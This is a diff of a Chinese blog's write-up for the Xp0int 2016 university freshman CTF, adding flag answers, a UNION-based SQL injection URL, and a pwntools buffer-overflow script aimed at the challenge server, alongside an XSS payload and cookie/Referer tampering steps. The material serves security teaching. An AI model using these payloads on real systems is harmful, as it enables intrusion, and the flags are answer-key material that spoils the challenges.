@@ -112,7 +112,7 @@
 <meta property="og:description" content="为了招揽安全方向的新生，暨南大学Xp0int团队组织了Xp0int2016新生杯交流赛。
 由于是民间团队，题目较基础，校内外大牛就不用来战了。
 本文总结了这次比赛题目的Write up，详细请查看全文。">
-<meta property="og:updated_time" content="2016-10-26T10:19:26.984Z">
+<meta property="og:updated_time" content="2016-10-27T14:21:04.676Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Xp0int新生杯交流赛Write up">
 <meta name="twitter:description" content="为了招揽安全方向的新生，暨南大学Xp0int团队组织了Xp0int2016新生杯交流赛。
@@ -388,14 +388,14 @@
 <p>想知道  flag ，去微信公众号Xp0int问一问吧！</p>
 </blockquote>
 <ul>
-<li>flag{Xp0int_123456789}</li>
+<li>flag{<strong>Xp0int_123456789</strong>}</li>
 </ul>
 <h2 id="Xp0int-Stegano"><a href="#Xp0int-Stegano" class="headerlink" title="Xp0int-Stegano"></a>Xp0int-Stegano</h2><blockquote>
 <p>这是Xp0int的图片，里面藏着信息，你能找到吗?<a href="http://www.giantbranch.cn:8889/static/uploads/9b364da433574cf67557e2647e974b41/xp0.png" target="_blank" rel="external">xp0.png</a></p>
 </blockquote>
 <p>基础的隐写术</p>
 <ul>
-<li>另存为图片，用记事本打开，最后一段写了flag</li>
+<li>另存为图片，用记事本打开，最后一段写了flag:<strong>X-p0int122333</strong></li>
 </ul>
 <h2 id="Xp0int-Change"><a href="#Xp0int-Change" class="headerlink" title="Xp0int-Change"></a>Xp0int-Change</h2><blockquote>
 <p>一串奇怪的字符，你需要解开它隐藏的秘密\u002d\u0032\u003a\u0064\u0063\u0075\u0067\u0038\u0036\u005c\u006f\u007a\u006a\u005c\u007c\u0072\u0039\u0059\u004a\u0043\u0079\u0063\u0059\u0037\u0032\u004e\u0059\u0054\u006f\u0051\u0046\u0065\u0037\u0051\u004a\u004c\u003b</p>
@@ -405,7 +405,7 @@
 </li>
 <li><p>前面的<strong>-2</strong>是提示我们向前偏移2个字符，所以写个<code>.py</code>再解码就解决了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">str1=<span class="string">'dcug86\ozj\|r9YJCycY72NYToQFe7QJL;'</span></div><div class="line">str2=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> str1:</div><div class="line">	str2+=chr(ord(x)<span class="number">-2</span>)</div><div class="line"><span class="keyword">print</span> base64.b64decode(str2[<span class="number">6</span>:])</div></pre></td></tr></table></figure>
-<p>直接输出flag</p>
+<p>直接输出flag:{<strong>Xp0int-df8798r</strong>}</p>
 </li>
 </ul>
 <h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><blockquote>
@@ -413,21 +413,21 @@
 </blockquote>
 <ul>
 <li>将文件后缀改为<code>.zip</code>（或者其他压缩格式）</li>
-<li>打开<code>/word/document.xml</code>目录,<code>ctrl+f</code>搜索<strong>flag</strong>关键词，得到flag</li>
+<li>打开<code>/word/document.xml</code>目录,<code>ctrl+f</code>搜索<strong>flag</strong>关键词，得到flag{<strong>Xp0int_y0u_ar4_5o_clever</strong>}</li>
 </ul>
 <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="where-r-u-from"><a href="#where-r-u-from" class="headerlink" title="where r u from"></a>where r u from</h2><blockquote>
 <p>你是谁？你从哪里来？要到哪里去<a href="http://pyzpyjy.cn/refer/" target="_blank" rel="external">http://pyzpyjy.cn/refer/</a></p>
 </blockquote>
 <p>题目已经说的很清楚了<code>from http://baidu.com enter</code></p>
 <ul>
-<li>修改请求头<strong>Referer</strong>参数<code>Referer: http://baidu.com</code></li>
+<li>修改请求头<strong>Referer</strong>参数<code>Referer: http://baidu.com</code>得到flag:{<strong>Xp0int-referer</strong>} </li>
 </ul>
 <h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><blockquote>
 <p>快输入点什么让它弹出flag吧<a href="http://pyzpyjy.cn/xss/" target="_blank" rel="external">http://pyzpyjy.cn/xss/</a></p>
 </blockquote>
 <p>非常基础的xss，未过滤<code>&lt;script&gt;</code></p>
 <ul>
-<li>直接在输入框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>直接在输入框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>得到flag:{<strong>Xp0int-xssinteresting</strong>} </li>
 </ul>
 <p><a id="getflag"></a></p>
 <h2 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h2><blockquote>
@@ -435,7 +435,7 @@
 </blockquote>
 <p>查看请求头后发现<strong>Cookie</strong>参数为<code>Cookie:flag=0</code></p>
 <ul>
-<li>很明显，直接修改<code>Cookie:flag=1</code>即可返回flag</li>
+<li>很明显，直接修改<code>Cookie:flag=1</code>即可返回flag{<strong>Xp0int_is_here</strong>}</li>
 </ul>
 <h2 id="无脑前端"><a href="#无脑前端" class="headerlink" title="无脑前端"></a>无脑前端</h2><blockquote>
 <p>输入正确的验证码就可以拿到flag咯！很简单吧！<a href="http://www.giantbranch.cn:8889/static/uploads/d2b01d2bc2dbe29712d11839b927b19b/lwh-.html" target="_blank" rel="external">lwh-.html</a></p>
@@ -443,7 +443,7 @@
 <p>查看源代码发现<code>&lt;head&gt;</code>上面引用了<code>&lt;script&gt;</code>脚本</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span> (<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">var</span> point=<span class="built_in">document</span>.getElementById(<span class="string">"check"</span>).value;</div><div class="line">	<span class="keyword">var</span> flag=<span class="string">"520"</span>;</div><div class="line">		<span class="built_in">document</span>.write(point);</div><div class="line">	<span class="keyword">if</span>(point==flag)</div><div class="line">	&#123;</div><div class="line">		alert(<span class="string">"ZmxhZyhYcDBpbnRBbm5vbW9yaXR5Sk5VKQo= (p.s.可以试一试base64解码)"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		alert(<span class="string">"输入有误"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <ul>
-<li>将<code>ZmxhZyhYcDBpbnRBbm5vbW9yaXR5Sk5VKQo=</code><strong>base64</strong>解码即可获得flag，确实非常无脑</li>
+<li>将<code>ZmxhZyhYcDBpbnRBbm5vbW9yaXR5Sk5VKQo=</code><strong>base64</strong>解码即可获得flag(<strong>Xp0intAnnomorityJNU</strong>)，确实非常无脑</li>
 </ul>
 <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP~"></a>PHP~</h2><blockquote>
 <p>师兄师姐的话不要全信<a href="http://www.lynnlinlin.cn/Xp0int/index.php" target="_blank" rel="external">http://www.lynnlinlin.cn/Xp0int/index.php</a></p>
@@ -455,19 +455,22 @@
 <ul>
 <li>先将<code>Xp0int233</code>编码为<code>%58%70%30%69%6e%74%32%33%33</code></li>
 <li>再一次编码为<code>%25%35%38%25%37%30%25%33%30%25%36%39%25%36%65%25%37%34%25%33%32%25%33%33%25%33%33</code></li>
-<li>注入返回flag</li>
+<li>注入返回flag: {<strong>Xp0int666666</strong>}</li>
 </ul>
 <h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><blockquote>
 <p><a href="http://123.207.1.235/ctf/setcookie.php" target="_blank" rel="external">http://123.207.1.235/ctf/setcookie.php</a></p>
 </blockquote>
 <p>与上面<a href="#getflag">Get flag</a>相同方法</p>
+<ul>
+<li>flag{<strong>Xp0int_is_a_great_team</strong>}</li>
+</ul>
 <h2 id="JsFuck"><a href="#JsFuck" class="headerlink" title="JsFuck"></a>JsFuck</h2><blockquote>
 <p><a href="http://123.207.1.235/ctf/jsfuck.html" target="_blank" rel="external">http://123.207.1.235/ctf/jsfuck.html</a></p>
 </blockquote>
 <p>JSFuck 可以只用 6 个字符 <code>[]()!+</code> 来编写 JavaScript 程序，可起到一定加密作用。教程：<a href="http://www.yiibai.com/t/jsfuck" target="_blank" rel="external">JsFuck教程</a></p>
 <p>我们自己去解析这么大段JsFuck是不可能的，所以用到工具网站<a href="http://www.jsfuck.com/" target="_blank" rel="external">http://www.jsfuck.com/</a></p>
 <ul>
-<li>复制JsFuck代码到工具网站揭秘，得到flag</li>
+<li>复制JsFuck代码到工具网站揭秘，得到flag{<strong>Xp0int_welcomes_you</strong>}</li>
 </ul>
 <h2 id="Login-Brute-Force"><a href="#Login-Brute-Force" class="headerlink" title="Login Brute Force"></a>Login Brute Force</h2><blockquote>
 <p><a href="http://pyzpyjy.cn/session/" target="_blank" rel="external">http://pyzpyjy.cn/session/</a></p>
@@ -480,7 +483,7 @@
 </li>
 <li><p>接着随便输入用户名、密码，并在弹窗期间进入<code>/admin/</code>，显示<code>Please login as admin!</code></p>
 </li>
-<li><p>将用户名改为<code>admin</code>后再次尝试，得到flag</p>
+<li><p>将用户名改为<code>admin</code>后再次尝试，得到flag{<strong>Xp0int-wobeikengle</strong>}</p>
 </li>
 </ul>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
@@ -498,6 +501,7 @@
 <p>降低难度，提交参数是id哦，别以为id=1就可以了，呵呵</p>
 <p>若访问不了，请过几秒后刷新</p>
 </blockquote>
+<p>提示<code>https://jctf2016-jncb.rhcloud.com/web200/?id=-1&quot;)%20union%20select%201,2,database()%23</code></p>
 <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h2><blockquote>
 <p>这是一个有趣的密码</p>
 <p>Hint: 百度识图</p>
@@ -505,7 +509,7 @@
 </blockquote>
 <p>由链接名称得知可能是<a href="http://baike.baidu.com/link?url=nDBZkL3_IMy-dCi0Nbz6JNFYhwsh8wmirPAL5PbXM440uoyHEUVy2MHpCA_C44SkQgdJzcsSzNGb2E42NS1vHK" target="_blank" rel="external">猪圈密码</a></p>
 <ul>
-<li>对照密码表翻译出3张图片代表<code>zhu</code>，提交即返还flag</li>
+<li>对照密码表翻译出3张图片代表<code>zhu</code>，提交即返还flag:{<strong>Xp0int-zhujuanmima</strong>}</li>
 </ul>
 <h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><blockquote>
 <p>..-. .-.. .- –.  -..- .–.  .. -. -  – — .-. … .  -.-. — -.. .  </p>
@@ -542,11 +546,18 @@
 <p>看到=标志进行<strong>base64</strong>转码，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">616d4e305a6e746c4e324a6c4e444e69595749795a6a4d344e7a51325a546b314f5455314d4452684e474d785a6d557a4e48303d</div></pre></td></tr></table></figure>
 <p>再<strong>ASCII</strong>转码，<br><code>amN0ZntlN2JlNDNiYWIyZjM4NzQ2ZTk1OTU1MDRhNGMxZmUzNH0=</code><br>再<strong>base64</strong>转码，出flag<br>jctf{<strong>e7be43bab2f38746e9595504a4c1fe34</strong>}</p>
-<p><strong><em>由brzhj25贡献</em></strong></p>
+<p><strong><em>此题由brzhj25贡献</em></strong></p>
 <h2 id="666666"><a href="#666666" class="headerlink" title="666666"></a>666666</h2><blockquote>
 <p>flag 666666 0123</p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/1b5968c7b7019cac21744fa13f96fc90/1.txt" target="_blank" rel="external">1.txt</a></p>
 </blockquote>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><blockquote>
+<p>直接下载看看吧</p>
+<p>nc 119.29.191.200 10100</p>
+<p><a href="http://www.giantbranch.cn:8889/static/uploads/5bca2d0024f8e640440a07702761e291/pwn150" target="_blank" rel="external">pwn150</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># p = process("./pwn100")</span></div><div class="line">p = remote(<span class="string">"119.29.191.200"</span>, <span class="string">"10100"</span>)</div><div class="line">ret = <span class="number">0x4005E4</span></div><div class="line">payload = <span class="string">"A"</span> *<span class="number">136</span> + p64(ret)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>我也不知道是什么</p>
 <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="请输入flag"><a href="#请输入flag" class="headerlink" title="请输入flag"></a>请输入flag</h2><blockquote>
 <p>Hit：尝试使用IDA，进行逆向，工具下载 请戳–&gt;<a href="http://down.52pojie.cn/Tools/Disassemblers/" target="_blank" rel="external">http://down.52pojie.cn/Tools/Disassemblers/</a></p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/bb61c803306fca6b3688eb00644689ed/re100.zip" target="_blank" rel="external">re100.zip</a></p>
@@ -554,27 +565,27 @@
 <p>做这道题的时候，刚刚看完王爽的《汇编语言》，但是没有怎么实战过。因为曾经网上看到 过一个别人的 writeup ，在一个逆向题里面的思路是通过函数找到字符串，继而找到 flag。 突然想着我也可以这么试试，回来用 IDA 打开程序，在函数窗口那里发现一个 strncmp 函 数，突然思路就来了。 </p>
 <p>从程序的角度来说，打开程序后就叫你输入 flag，所以程序内部肯定有这么一个环节，是把 我们输入的字符串和它内部产生的正确的 flag 做一个比较，相同就返回正确的提示信息。所 以我只要程序运行之后，随便输入一个字符串，然后跳到 strncmp 函数处，跟随函数的执 行，应该就能发现正确的 flag。IDA 动态调试了一下，思路正确，得到 flag。 </p>
 <p>flag:<strong>we1c0_2_xp0int</strong></p>
-<p><strong><em>由Plus贡献</em></strong></p>
+<p><strong><em>此题由Plus贡献</em></strong></p>
 <h2 id="first-Android"><a href="#first-Android" class="headerlink" title="first Android"></a>first Android</h2><blockquote>
 <p>破解大师，不要费劲心思破解了</p>
 <p><a href="http://www.giantbranch.cn:8889/static/uploads/b4c16350eb72959ab3961361dddf0904/crackme0001.apk" target="_blank" rel="external">crackme0001.apk</a></p>
 </blockquote>
-<p>先将apk解压，找出其中的classes.dex，用dex2jar转为jar，然后这里就卡了，把jar放在jd-gui中分析半天没出结果= =，结果发现想太多，直接把apk拖进UltraEdit，查找字符串flag，出结果。</p>
+<p>直接将apk拖进ApkIDE，全部文件搜索flag查到</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;string name="iamhere"&gt;看看flag在哪吧，我怎么认为最危险的地方就是最安全的地方呢&lt;/string&gt;</div><div class="line">&lt;string name="j47f"&gt;jctf&#123;y0u_le6rn_that&#125;&lt;/string&gt;</div></pre></td></tr></table></figure>
 <p>jctf{<strong>y0u_le6rn_that</strong>}</p>
-<p><strong><em>由brzhj25贡献</em></strong></p>
 <h2 id="Read-ASM"><a href="#Read-ASM" class="headerlink" title="Read ASM"></a>Read ASM</h2><blockquote>
 <p>int main(int argc, char const *argv[])<br>{<br> char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};<br> func(input, 28);<br> printf(“%s\n”,input+1);<br> return 0;<br>}<br>func函数的asm代码如下:<br>00000000004004e6 :<br> 4004e6: 55                    push   rbp<br> 4004e7: 48 89 e5              mov    rbp,rsp<br> 4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi<br> 4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi<br> 4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1<br> 4004f8: eb 28                 jmp    400522<br> 4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br> 4004fd: 48 63 d0              movsxd rdx,eax<br> 400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]<br> 400504: 48 01 d0              add    rax,rdx<br> 400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]<br> 40050a: 48 63 ca              movsxd rcx,edx<br> 40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]<br> 400511: 48 01 ca              add    rdx,rcx<br> 400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]<br> 400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]<br> 40051a: 31 ca                 xor    edx,ecx<br> 40051c: 88 10                 mov    BYTE PTR [rax],dl<br> 40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1<br> 400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]<br> 400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]<br> 400528: 7e d0                 jle    4004fa<br> 40052a: 90                    nop<br> 40052b: 5d                    pop    rbp<br> 40052c: c3                    ret              </p>
 </blockquote>
 <p>主要就是要读懂汇编码= =，没啥好说的，放一下func的源程序，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void func(char input[],int num)</div><div class="line">&#123;</div><div class="line">	int i = 1;</div><div class="line">	while(i &lt;= num)</div><div class="line">	&#123;</div><div class="line">		*(input[0]+i) ^= i; </div><div class="line">		i++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">char</span> input[],<span class="keyword">int</span> num)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</div><div class="line">	<span class="keyword">while</span>(i &lt;= num)</div><div class="line">	&#123;</div><div class="line">		*(input[<span class="number">0</span>]+i) ^= i; </div><div class="line">		i++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>跑一下出结果：<br>flag{<strong>read_asm_is_the_basic</strong>}</p>
-<p><strong><em>由brzhj25贡献</em></strong></p>
+<p><strong><em>此题由brzhj25贡献</em></strong></p>
 <h2 id="抛骰子"><a href="#抛骰子" class="headerlink" title="抛骰子"></a>抛骰子</h2><blockquote>
 <p>好玩的抛骰子游戏，大家快来玩啊！</p>
 <p><a href="http://pan.baidu.com/s/1slTHxcp" target="_blank" rel="external">http://pan.baidu.com/s/1slTHxcp</a></p>
 </blockquote>
 <p>下载下来放进OD里，运行发现只有每次准确扔出特定的点数，程序才会进行下一步操作，否则退出。在每一次程序作出判断前下断，将跳转到失败代码处的汇编语句改掉，如jz改为jnz，重复几次后出结果。<br>flag{<strong>9a9689dbd47a1fd3fc0bf17d60edf545</strong>}</p>
-<p><strong><em>由brzhj25贡献</em></strong></p>
+<p><strong><em>此题由brzhj25贡献</em></strong></p>
 
       
     </div>
@@ -810,7 +821,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#签到题"><span class="nav-number">1.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xp0int-Stegano"><span class="nav-number">1.2.</span> <span class="nav-text">Xp0int-Stegano</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xp0int-Change"><span class="nav-number">1.3.</span> <span class="nav-text">Xp0int-Change</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐写术"><span class="nav-number">1.4.</span> <span class="nav-text">隐写术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#where-r-u-from"><span class="nav-number">2.1.</span> <span class="nav-text">where r u from</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">2.2.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-flag"><span class="nav-number">2.3.</span> <span class="nav-text">Get flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无脑前端"><span class="nav-number">2.4.</span> <span class="nav-text">无脑前端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">2.5.</span> <span class="nav-text">PHP~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie"><span class="nav-number">2.6.</span> <span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JsFuck"><span class="nav-number">2.7.</span> <span class="nav-text">JsFuck</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login-Brute-Force"><span class="nav-number">2.8.</span> <span class="nav-text">Login Brute Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#操作"><span class="nav-number">2.8.1.</span> <span class="nav-text">操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">2.8.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#类似功能的源码"><span class="nav-number">2.8.3.</span> <span class="nav-text">类似功能的源码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注注注"><span class="nav-number">2.9.</span> <span class="nav-text">注注注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto1"><span class="nav-number">3.1.</span> <span class="nav-text">Crypto1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Morse"><span class="nav-number">3.2.</span> <span class="nav-text">Morse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你猜"><span class="nav-number">3.3.</span> <span class="nav-text">你猜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GO"><span class="nav-number">3.4.</span> <span class="nav-text">GO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搞那么多干嘛"><span class="nav-number">3.5.</span> <span class="nav-text">搞那么多干嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#666666"><span class="nav-number">3.6.</span> <span class="nav-text">666666</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#请输入flag"><span class="nav-number">4.1.</span> <span class="nav-text">请输入flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#first-Android"><span class="nav-number">4.2.</span> <span class="nav-text">first Android</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Read-ASM"><span class="nav-number">4.3.</span> <span class="nav-text">Read ASM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抛骰子"><span class="nav-number">4.4.</span> <span class="nav-text">抛骰子</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">1.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#签到题"><span class="nav-number">1.1.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xp0int-Stegano"><span class="nav-number">1.2.</span> <span class="nav-text">Xp0int-Stegano</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Xp0int-Change"><span class="nav-number">1.3.</span> <span class="nav-text">Xp0int-Change</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐写术"><span class="nav-number">1.4.</span> <span class="nav-text">隐写术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#where-r-u-from"><span class="nav-number">2.1.</span> <span class="nav-text">where r u from</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss"><span class="nav-number">2.2.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-flag"><span class="nav-number">2.3.</span> <span class="nav-text">Get flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无脑前端"><span class="nav-number">2.4.</span> <span class="nav-text">无脑前端</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">2.5.</span> <span class="nav-text">PHP~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie"><span class="nav-number">2.6.</span> <span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JsFuck"><span class="nav-number">2.7.</span> <span class="nav-text">JsFuck</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Login-Brute-Force"><span class="nav-number">2.8.</span> <span class="nav-text">Login Brute Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#操作"><span class="nav-number">2.8.1.</span> <span class="nav-text">操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">2.8.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#类似功能的源码"><span class="nav-number">2.8.3.</span> <span class="nav-text">类似功能的源码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注注注"><span class="nav-number">2.9.</span> <span class="nav-text">注注注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto1"><span class="nav-number">3.1.</span> <span class="nav-text">Crypto1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Morse"><span class="nav-number">3.2.</span> <span class="nav-text">Morse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你猜"><span class="nav-number">3.3.</span> <span class="nav-text">你猜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GO"><span class="nav-number">3.4.</span> <span class="nav-text">GO</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搞那么多干嘛"><span class="nav-number">3.5.</span> <span class="nav-text">搞那么多干嘛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#666666"><span class="nav-number">3.6.</span> <span class="nav-text">666666</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">4.</span> <span class="nav-text">pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">5.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#请输入flag"><span class="nav-number">5.1.</span> <span class="nav-text">请输入flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#first-Android"><span class="nav-number">5.2.</span> <span class="nav-text">first Android</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Read-ASM"><span class="nav-number">5.3.</span> <span class="nav-text">Read ASM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抛骰子"><span class="nav-number">5.4.</span> <span class="nav-text">抛骰子</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
